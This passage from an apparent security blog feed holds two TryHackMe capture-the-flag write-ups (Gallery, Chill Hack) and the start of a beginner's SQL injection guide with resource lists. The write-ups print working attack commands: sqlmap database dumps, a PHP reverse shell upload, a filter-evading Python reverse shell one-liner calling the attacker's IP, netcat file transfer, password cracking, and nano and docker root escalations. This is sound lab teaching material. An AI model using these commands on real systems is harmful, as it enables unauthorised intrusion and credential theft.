<p><img src="/assets/img/tryhackme/gallery/sql1.png" alt="sql1" /></p>

<p>The page explains what to do.</p>

<p><img src="/assets/img/tryhackme/gallery/sql2.png" alt="sql2" /></p>

<p>We need to capture the request for a picture with Burp Suite.
Right click &gt; Save item and we need to save the request and run it in sqlmap.</p>

<p>Let ‚Äòs do it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r text.req --dbs
</code></pre></div></div>

<p>There are <code class="language-plaintext highlighter-rouge">Boolean Based</code> and <code class="language-plaintext highlighter-rouge">Time Based</code> vulnerabilities of SQLi types on the site.</p>

<p><img src="/assets/img/tryhackme/gallery/kind.png" alt="kind" /></p>

<p>With the <code class="language-plaintext highlighter-rouge">--dbs</code> tag, sqlmap will give us the database names.</p>

<p><img src="/assets/img/tryhackme/gallery/databases.png" alt="databases" /></p>

<p>Now that we know the database names, let‚Äôs get the tables.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D &lt;database-name&gt; --tables 
</code></pre></div></div>

<p>I dumped the tables for <code class="language-plaintext highlighter-rouge">gallery_db</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/tables.png" alt="tables" /></p>

<p>Now I will empty the columns of the <code class="language-plaintext highlighter-rouge">users</code> table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users --columns
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/columns.png" alt="columns" /></p>

<p>Now let‚Äôs dump the <code class="language-plaintext highlighter-rouge">id, username, firstname, and password</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users -C id,username,firstname,password --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/dump.png" alt="dump" /></p>

<p><br /></p>

<h3 id="14-whats-the-user-flag">1.4 What‚Äôs the user flag?</h3>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.35.177/gallery/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/gobuster.png" alt="gobuster" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/uploads</code> directory caught my attention. Maybe I can run the <code class="language-plaintext highlighter-rouge">reverse shell</code> that I will upload from this directory.</p>

<p>Let‚Äôs try.</p>

<p>First, go to albums, then create a new album, then you can upload files from inside the album.</p>

<p>Let‚Äôs create and upload our reverse shell. <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey‚Äôs PHP Reverse Shell</a></p>

<p><img src="/assets/img/tryhackme/gallery/upload.png" alt="upload" /></p>

<p>Now I‚Äôm setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Now let‚Äôs go to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory and find the file we uploaded.</p>

<p><img src="/assets/img/tryhackme/gallery/shell.png" alt="shell" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/in.png" alt="in" /></p>

<p>I see two folders named <code class="language-plaintext highlighter-rouge">mike</code> and <code class="language-plaintext highlighter-rouge">ubuntu</code> in my <code class="language-plaintext highlighter-rouge">/home</code> directory.</p>

<p><img src="/assets/img/tryhackme/gallery/users.png" alt="users" /></p>

<p>We need Mike‚Äôs password for <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/denied.png" alt="denied" /></p>

<p>I didn‚Äôt know what to do and decided to run <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">linpeas.sh</a> on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/mikepass.png" alt="mikepass" /></p>

<p>We found a password as you can see in the picture, but I don‚Äôt know who it belongs to.</p>

<p>Let‚Äôs try it for Mike.</p>

<p><img src="/assets/img/tryhackme/gallery/sumike.png" alt="sumike" /></p>

<p>And it worked. If you get an error, run the following codes on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/term.png" alt="term" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
$ stty raw -echo;fg
$ reset
$ xterm
</code></pre></div></div>

<p>Let‚Äôs get the user flag.</p>

<p><img src="/assets/img/tryhackme/gallery/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2--escalate-to-the-root-user">2.  Escalate to the root user</h2>

<p>Good luck with the last step !</p>

<p><br /></p>

<h3 id="21-whats-the-root-flag">2.1 What‚Äôs the root flag?</h3>

<p>Let‚Äôs try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>

<p><img src="/assets/img/tryhackme/gallery/sudol.png" alt="sudol" /></p>

<p>It seems we can run <code class="language-plaintext highlighter-rouge">rootkit.sh</code> with root privileges without requiring a password.</p>

<p>Let‚Äôs see what‚Äôs in it.</p>

<p><img src="/assets/img/tryhackme/gallery/rootkit.png" alt="rootkit" /></p>

<p>This means that we can use the <code class="language-plaintext highlighter-rouge">nano</code> to get root.</p>

<p>I‚Äôm looking at <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> to see if I can find anything about nano.</p>

<p>Let‚Äôs try this.</p>

<p><img src="/assets/img/tryhackme/gallery/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export TERM=xterm
$ sudo /bin/bash /opt/rootkit.sh
$ read
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/opt.png" alt="opt" /></p>

<p>After typing <code class="language-plaintext highlighter-rouge">read</code>, nano will open. Then we will do the following in order:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ^R^X
   reset; sh 1&gt;&amp;0 2&gt;&amp;0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/execute.png" alt="execute" /></p>

<p>And we are <code class="language-plaintext highlighter-rouge">root</code>. Yes!</p>

<p><img src="/assets/img/tryhackme/gallery/rootin.png" alt="rootin" /></p>

<p>Let‚Äôs get the root flag.</p>

<p><img src="/assets/img/tryhackme/gallery/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Chill Hack</title><link href="http://localhost:4000/tryhackme-chill-hack/" rel="alternate" type="text/html" title="TryHackMe - Chill Hack" /><published>2023-05-09T00:00:00+03:00</published><updated>2023-05-09T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chill-hack</id><content type="html" xml:base="http://localhost:4000/tryhackme-chill-hack/"><![CDATA[<p>Easy level CTF.  Capture the flags and have fun!</p>

<p><br /></p>

<h2 id="1-user-flag">1. User Flag</h2>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.249.219
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, 80/tcp HTTP</code></p>

<p><img src="/assets/img/tryhackme/chill-hack/ftp.png" alt="ftp" /></p>

<p>It seems we can log in FTP server anonymously.
And there is a file called <code class="language-plaintext highlighter-rouge">note.txt</code> on the server.</p>

<p>Let‚Äôs take a look at what‚Äôs written inside <code class="language-plaintext highlighter-rouge">note.txt</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/note.png" alt="note" /></p>

<p><em><code class="language-plaintext highlighter-rouge">Anurodh told me that there is some filtering on strings being put in the command -- Apaar</code></em></p>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p><img src="/assets/img/tryhackme/chill-hack/home.png" alt="home" /></p>

<p>I‚Äôve been browsing the site but nothing remarkable.</p>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.249.219  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/gobuster.png" alt="gobuster" /></p>

<p>We found the <em><code class="language-plaintext highlighter-rouge">/secret</code></em> directory.</p>

<p>Let‚Äôs look at this page.</p>

<p>We found a page where we can run commands.</p>

<p>I try to run a few commands but something like this comes up.</p>

<p><img src="/assets/img/tryhackme/chill-hack/alert.png" alt="alert" /></p>

<p>I‚Äôm trying to do a reverse shell, but none of the codes I tried worked. Except this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.86.168",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

</code></pre></div></div>

<p>I ran the code like <code class="language-plaintext highlighter-rouge">p\ython</code> instead of python. We are inside now.</p>

<p><img src="/assets/img/tryhackme/chill-hack/in.png" alt="in" /></p>

<p>I found an interesting file in <code class="language-plaintext highlighter-rouge">/var/www</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/ints.png" alt="ints" /></p>

<p>Let‚Äôs look at the <code class="language-plaintext highlighter-rouge">/files</code> directory.</p>

<p><img src="/assets/img/tryhackme/chill-hack/files.png" alt="files" /></p>

<p>What‚Äôs in these files? Let‚Äôs look.</p>

<p><strong><code class="language-plaintext highlighter-rouge">account.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/account.png" alt="account" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">hacker.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/hacker.png" alt="hacker" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">index.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/index.png" alt="index" /></p>

<p>We found important things in the index.php file.</p>

<p><code class="language-plaintext highlighter-rouge">Mysql - Database: webportal</code>, <code class="language-plaintext highlighter-rouge">root:*************</code></p>

<p>Let‚Äôs see if we can log in to <code class="language-plaintext highlighter-rouge">MySQL</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mysql -u root -p 
$ show databases;
$ use webportal
$ show tables;
$ select * from users;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/mysql.png" alt="mysql" /></p>

<p>We find the encrypted version of the passwords of Anurodh and Apaar.</p>

<p>Let‚Äôs look at the type of passwords.</p>

<p><img src="/assets/img/tryhackme/chill-hack/id.png" alt="id" /></p>

<p>It seems passwords are encoded using md5. Let‚Äôs crack these passwords.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Anurodh</code></strong>;</p>

<p><img src="/assets/img/tryhackme/chill-hack/crack1.png" alt="crack1" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Apaar</code></strong>;</p>

<p><img src="/assets/img/tryhackme/chill-hack/crack2.png" alt="crack2" /></p>

<p>I try these passwords for ssh login. But it‚Äôs not working.</p>

<p>So let‚Äôs back the <code class="language-plaintext highlighter-rouge">hacker.php</code>. Firstly, we must download the <code class="language-plaintext highlighter-rouge">hacker-with-laptop_23-2147985341.jpg</code> file.</p>

<p>In my machine;</p>

<p><img src="/assets/img/tryhackme/chill-hack/mine.png" alt="mine" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 &gt; hacker-with-laptop_23-2147985341.jpg
</code></pre></div></div>

<p>In target machine;</p>

<p><img src="/assets/img/tryhackme/chill-hack/target.png" alt="target" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc my-ip 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg
</code></pre></div></div>

<p>We get the file. Now, need to use <code class="language-plaintext highlighter-rouge">steghide</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
$ zip2john backup.zip &gt; hash.hash
$ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/steghide.png" alt="steghide" /></p>

<p>Now that we‚Äôve found the password, let‚Äôs see what‚Äôs inside the <code class="language-plaintext highlighter-rouge">backup.zip</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/zip.png" alt="zip" /></p>

<p>We found Anurodh‚Äôs password in <code class="language-plaintext highlighter-rouge">source_code.php</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/encode.png" alt="encode" /></p>

<p>Let‚Äôs decode.</p>

<p><img src="/assets/img/tryhackme/chill-hack/decode.png" alt="decode" /></p>

<p>Now, we can access Anurodh‚Äôs ssh.</p>

<p><img src="/assets/img/tryhackme/chill-hack/ssh.png" alt="ssh" /></p>

<p>I try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command and it works.</p>

<p><img src="/assets/img/tryhackme/chill-hack/sudol.png" alt="sudol" /></p>

<p>We have a bash file for Apaar that we can run without requiring a password.</p>

<p>Let‚Äôs see what‚Äôs in it.</p>

<p><img src="/assets/img/tryhackme/chill-hack/writein.png" alt="writein" /></p>

<p>Let‚Äôs run the file and try adding <code class="language-plaintext highlighter-rouge">/bin/bash</code> to it.</p>

<p><img src="/assets/img/tryhackme/chill-hack/helpline.png" alt="helpline" /></p>

<p>Yeah, it‚Äôs work. Now we can access Apaar.</p>

<p>Let‚Äôs get the user flag.</p>

<p><img src="/assets/img/tryhackme/chill-hack/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="2-root-flag">2. Root Flag</h3>

<p>Now, we must return back to Anurodh.</p>

<p>I found this and it‚Äôs interesting.</p>

<p><img src="/assets/img/tryhackme/chill-hack/docker.png" alt="docker" /></p>

<p>I‚Äôm looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about Docker.</p>

<p>Let‚Äôs try this code.</p>

<p><img src="/assets/img/tryhackme/chill-hack/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre></div></div>

<p>And we are root. Yes!</p>

<p><img src="/assets/img/tryhackme/chill-hack/rootin.png" alt="rootin" /></p>

<p>Let‚Äôs get the root flag.</p>

<p><img src="/assets/img/tryhackme/chill-hack/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="command-injection, sql-injection, real-world" /><summary type="html"><![CDATA[Easy level CTF. Capture the flags and have fun!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chill-hack.png" /><media:content medium="image" url="http://localhost:4000/assets/img/chill-hack.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SQL Injection Guide</title><link href="http://localhost:4000/sql-injection-guide/" rel="alternate" type="text/html" title="SQL Injection Guide" /><published>2023-05-06T00:00:00+03:00</published><updated>2023-05-06T00:00:00+03:00</updated><id>http://localhost:4000/sql-injection-guide</id><content type="html" xml:base="http://localhost:4000/sql-injection-guide/"><![CDATA[<p>In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level.  So, I preferred a shorter and clearer explanation.</p>

<p>But it would not be right for me to give only the basic information in my article. I want you to understand the basics, and let the SQL injection fit your logic. So, there are many <a href="#sources">resources</a> that I have shared in this article, check them out. There are many <a href="#labs">labs</a> where you can practice your knowledge. I also shared a lot of <a href="#chs">cheat sheets</a> as a helper.</p>

<p>I hope the article is useful to you. It helps you to learn SQL injection :worried:</p>

<h3 id="topics">Topics</h3>

<ul>
  <li><a href="#bft">Basic First</a> <br /></li>
  <li><a href="#sit">SQL Injection and Types</a> <br /></li>
  <li><a href="#labs">SQL Injection Labs</a> <br /></li>
  <li><a href="#sources">SQL Injection Sources</a> <br /></li>
  <li><a href="#chs">SQL Injection Cheat Sheats</a> <br /></li>
</ul>

<p><br /></p>

<p><img src="/assets/video/sqli-guide/sqli-attack.png" alt="sqli" /></p>

<h3 id="bft">Basic First</h3>

<h3 id="what-is-a-database">What is a Database?</h3>

<p>A <code class="language-plaintext highlighter-rouge">database</code> is where all kinds of data and information are stored electronically.</p>

<h3 id="what-is-database-management-system-dbms">What is Database Management System (DBMS)?</h3>

<p>The database is usually controlled by a <code class="language-plaintext highlighter-rouge">Database Management System (DBMS)</code>. Thanks to this system, data can be easily accessed, managed, changed, updated, and organized.</p>

<p>Most databases today use <code class="language-plaintext highlighter-rouge">SQL</code>.</p>

<h3 id="what-is-sql">What is SQL?</h3>

<p><code class="language-plaintext highlighter-rouge">SQL</code> is a programming language used in databases to query, manipulate and define data, as well as to provide access control.</p>

<p><br /></p>

<h3 id="sit">SQL Injection and Types</h3>

<p>A web application sends SQL queries to use data found in the database. The attacker can inject their own queries into these SQL queries or manipulate the queries. In this case, it can access other information stored in the database. We call this situation the <code class="language-plaintext highlighter-rouge">SQL Injection</code> vulnerability.</p>

<p>A successful <code class="language-plaintext highlighter-rouge">SQL injection</code> attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.  In some cases, an attacker can obtain a persistent backdoor into an organization‚Äôs systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>

<p><br /></p>
<h3 id="error-based-sqli">Error-Based SQLi</h3>

<p>An error is received in response to submitted SQL queries. The attacker can also send new queries according to this error, or by manipulating the error, he can reach the information he wants to reach from within the output.</p>

<p><br /></p>
<h3 id="union-based-sqli">Union-Based SQLi</h3>

<p>Multiple <code class="language-plaintext highlighter-rouge">Select</code> queries can be written using the <code class="language-plaintext highlighter-rouge">Union</code> operator. In this case, the attacker can write his own SELECT query with a union operator. But it should be noted that when the union expression is used, the <code class="language-plaintext highlighter-rouge">number of columns must be equal</code> to each other.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Union-Based-SQLi.mp4" type="video/mp4" />
</video>

<p><br /></p>

<h3 id="boolean-based-sqli">Boolean-Based SQLi</h3>

<p>It does not return an error or requested information in response to submitted SQL queries. Instead, it gives a <code class="language-plaintext highlighter-rouge">true or false</code> answer. This makes the process very long.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Boolean-Based-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="time-based-sqli">Time-Based SQLi</h3>

<p>It doesn‚Äôt return anything in response to submitted SQL queries. However, the attacker tries to see if the query works by adding functions such as <code class="language-plaintext highlighter-rouge">sleep()</code> to these SQL queries.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Time-Based-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="out-of-ban-sqli">Out-of-Ban SQLi</h3>

<p>None of the techniques described so far will work. The application‚Äôs response doesn‚Äôt depend on whether the query returns any data, on whether a database error occurs or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.</p>

<p>Various network protocols can be used for this purpose, but typically the most effective is DNS.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Out-of-Band-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="warning">Warning</h3>

<p>Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you‚Äôre injecting into, it‚Äôs common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p>

<p><br /></p>

<h3 id="labs">SQL Injection Labs</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/all-labs">Web Security Academy - All Labs</a></li>
  <li><a href="https://tryhackme.com/room/sqlilab">TryHackMe - SQL Injection Lab</a></li>
  <li><a href="https://tryhackme.com/room/owaspjuiceshop">TryHackMe - OWASP Juice Shop</a></li>
  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
  <li><a href="https://tryhackme.com/room/sqlmap">TryHackMe - Sqlmap</a></li>
  <li><a href="https://tryhackme.com/room/gamezone">TryHackMe - Game Zone</a></li>
  <li><a href="https://tryhackme.com/room/poster">TryHackMe - Poster</a></li>
  <li><a href="https://tryhackme.com/room/chillhack">TryHackMe - Chill Hack</a> - <a href="https://mr0wido.github.io/tryhackme-chill-hack/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/gallery666">TryHackMe - Gallery</a> - <a href="https://mr0wido.github.io/tryhackme-gallery/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/avengers">TryHackMe - Avengers Blog</a></li>
  <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a> - <a href="https://mr0wido.github.io/tryhackme-the-marketplace/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/wekorra">TryHackMe - Wekor</a></li>
  <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
  <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a></li>
  <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a></li>
  <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a></li>
  <li><a href="https://tryhackme.com/room/metamorphosis">TryHackMe - Metamorphosis</a></li>
  <li><a href="https://tryhackme.com/room/wwbuddy">TryHackMe - WWBuddy</a></li>
  <li><a href="https://tryhackme.com/room/unstabletwin">TryHackMe - Unstable Twin</a></li>
  <li><a href="https://tryhackme.com/room/dailybugle">TryHackMe - Daily Bugle</a> - <a href="https://mr0wido.github.io/tryhackme-daily-bugle/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/yearofthedog">TryHackMe - Year of the Dog</a></li>
  <li><a href="https://tryhackme.com/room/yearofthepig">TryHackMe - Year of the Pig</a></li>
  <li><a href="https://tryhackme.com/room/m4tr1xexitdenied">TryHackMe - M4tr1x: Exit Denied</a></li>
  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">PentesterLab - From SQL Injection to Shell</a></li>
  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course">PentesterLab - From SQL Injection to Shell: PostgreSQL Edition</a></li>
  <li><a href="https://ctflearn.com/challenge/88">CTFLearn - Basic Injection</a></li>
  <li><a href="https://ctflearn.com/challenge/149">CTFLearn - Inj3ction Time</a></li>
</ul>

<p><br /></p>

<h3 id="sources">SQL Injection Sources</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy - SQL injection</a></li>
  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
  <li><a href="https://www.hackerrank.com/domains/sql">HackerRank - SQL</a></li>
  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP - SQL Injection</a></li>
  <li><a href="https://systemweakness.com/handbook-for-sql-injection-2c12ec29d7ee">Niveet Palan - Handbook for SQL Injection</a></li>
  <li><a href="https://thegrayarea.tech/p1-bug-hunting-a-step-by-step-guide-to-sql-injection-76f95c8986b0">Graham Zemel - Step by Step Guide to SQL Injection</a></li>
  <li><a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">Raj Chandel‚Äôs Blog - Manual SQL Injection Exploitation Step by Step</a></li>
  <li><a href="https://infosecwriteups.com/a-technique-that-a-lot-of-sql-injection-beginners-dont-know-atmanand-nagpure-write-up-abdc7c269dd5">Atmanand Nagpure - A technique that a lot of SQL injection beginners don‚Äôt know</a></li>
  <li><a href="https://infosecwriteups.com/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5">goswamiijaya - Identifying &amp; Exploiting SQL Injections: Manual &amp; Automated</a></li>
  <li><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/SQL%20Injection.md">daffainfo - SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/definitive-guide-to-sql-injection-df5ac445eef1">Security Lit Limited - Definitive Guide to SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94">goswamiijaya - Exploiting Error Based SQL Injections &amp; Bypassing Restrictions</a></li>
  <li><a href="https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b">Lee Chun How - Out-of-Band (OOB) SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/first-steps-to-sql-injection-45fc0d9aae21">Mcry - First step to an SQL-Injection</a></li>
  <li><a href="https://infosecwriteups.com/sql-injection-an-overview-1057c5729dc5">Secpy Community - SQL Injection: An Overview</a></li>
  <li><a href="https://infosecwriteups.com/what-is-sql-injection-6985c298ea20">Frost - What is SQL Injection and How Does it Work</a></li>
  <li><a href="https://application.security/free-application-security-training/owasp-top-10-sql-injection">Kontra Application Security - SQL Injection</a></li>
  <li><a href="https://www.hacksplaining.com/exercises/sql-injection#/start">Start - SQL Injections</a></li>
  <li><a href="https://ctflearn.com/lab/SQL-Injection-Part-1">CTFlearn - SQL Injection</a></li>
  <li><a href="https://www.imperva.com/learn/application-security/sql-injection-sqli/">Imperva - What is SQL Injection</a></li>
  <li><a href="https://python.plainenglish.io/pentesting-introduction-to-sql-injection-attack-part-1-5166e4617b71">Edward Low - Edward Low</a></li>
  <li><a href="https://systemweakness.com/sql-injection-important-things-you-need-to-know-right-now-b173cdea0610">Sudarshan S - SQL INJECTION: IMPORTANT‚Ä¶</a></li>
  <li><a href="https://systemweakness.com/sql-injection-6348398d6651">Arth Detroja - SQL Injection</a></li>
  <li><a href="https://a51f221b.medium.com/web-penetration-testing-guide-3a5162731fe6">A51F221B - Web penetration testing guide</a></li>
  <li><a href="https://www.w3schools.com/sql/default.asp">W3Schools - SQL Tutorial</a></li>
  <li><a href="https://www.codecademy.com/learn/learn-sql">Codecademy - Learn SQL</a></li>
  <li><a href="https://www.programiz.com/sql">Programiz - Learn SQL: SQL Tutorial for Beginners</a></li>
  <li><a href="https://www.tutorialspoint.com/sql/index.htm">TutorialsPoint - SQL Tutorial</a></li>
  <li><a href="https://roadmap.sh/cyber-security">Cyber Security Roadmap</a></li>
</ul>

<p><br /></p>

<h3 id="chs">SQL Injection Cheat Sheets</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy - SQL Injection Cheat Sheet</a></li>
  <li><a href="https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b">Ismail Tasdelen - SQL Injection Payload List</a></li>
  <li><a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">Pentestmonkey - Oracle SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Pentestmonkey - MySQL SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">Pentestmonkey - Postgres SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey - Informix SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentestmonkey - MSSQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey - DB2 SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">Pentestmonkey - Ingres SQL Injection Cheat Sheet</a></li>
  <li><a href="https://www.codecademy.com/learn/defending-express-applications-from-sql-injection-xss-csrf-attacks/modules/preventing-sql-injection-attacks/cheatsheet">Codecademy - Preventing SQL Injection Attacks</a></li>
  <li><a href="https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/">Exploiting hard filtered SQL Injections</a></li>
  <li><a href="http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html">MS Access SQL Injection Cheat Sheet</a></li>
